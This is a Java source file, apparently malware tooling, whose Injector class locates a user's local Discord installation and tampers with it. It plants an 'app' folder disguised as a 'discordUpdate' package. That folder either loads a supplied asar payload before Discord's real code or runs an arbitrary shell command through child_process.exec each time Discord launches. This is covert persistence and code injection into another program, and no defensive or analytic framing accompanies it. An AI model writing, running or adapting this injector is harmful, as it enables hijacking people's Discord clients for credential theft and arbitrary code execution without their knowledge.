package me.corruptedbytes;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Injector {
	
	private static Injector INSTANCE;
	File discordBasePath = new File(System.getenv("LOCALAPPDATA") + File.separator + "Discord" + File.separator);
	
	public Injector() {
		INSTANCE = this;
	}
	
	public static Injector getINSTANCE() {
		new Injector();
		return INSTANCE;
	}
	
	public void injectAsar(String asarFile) throws Exception {
		if (getDiscordPath() != null && checkCreatedFolder()) {
			new File(getDiscordPath() + "app").mkdir();

			Files.copy(Paths.get(asarFile), Paths.get(getDiscordPath() + "app" + File.separator + "update.asar"));
			
			BufferedWriter writer = new BufferedWriter(new FileWriter(getDiscordPath() + "app" + File.separator + "package.json"));
		    writer.write("{\"name\":\"discordUpdate\",\"main\":\"index.js\"}");
		    writer.close();
		    
		    BufferedWriter writer2 = new BufferedWriter(new FileWriter(getDiscordPath() + "app" + File.separator + "index.js"));
		    writer2.write("require(\"update.asar\");\nrequire(\"../app.asar\");");
		    writer2.close();
		}
		else
		{
			throw new Exception();
		}
	}
	
	public void injectShellCommand(String command) throws Exception {
		if (getDiscordPath() != null && checkCreatedFolder()) {
			new File(getDiscordPath() + File.separator + "app").mkdir();

			BufferedWriter writer = new BufferedWriter(new FileWriter(getDiscordPath() + File.separator + "app" + File.separator + "package.json"));
		    writer.write("{\"name\":\"discordUpdate\",\"main\":\"index.js\"}");
		    writer.close();
		    
		    BufferedWriter writer2 = new BufferedWriter(new FileWriter(getDiscordPath() + File.separator + "app" + File.separator + "index.js"));
		    writer2.write("var cp = require('child_process');\ncp.exec(\"" + command + "\",function(c,e,i){});\nrequire(\"../app.asar\");");
		    writer2.close();
		}
		else
		{
			throw new Exception();
		}
	}
	
	private String getDiscordPath() {
		File[] listOfFiles = discordBasePath.listFiles();

		for (int i = 0; i < listOfFiles.length; i++) {
		    if (listOfFiles[i].isDirectory() && listOfFiles[i].toString().contains("app-")) return new File(listOfFiles[i].toString() + File.separator + "resources").getAbsolutePath();
		}
		return null;
	}
	
	private boolean checkCreatedFolder() {
		if (!new File(getDiscordPath() + File.separator + "app").exists()) {
			return true;
		}
		return false;
	}

}
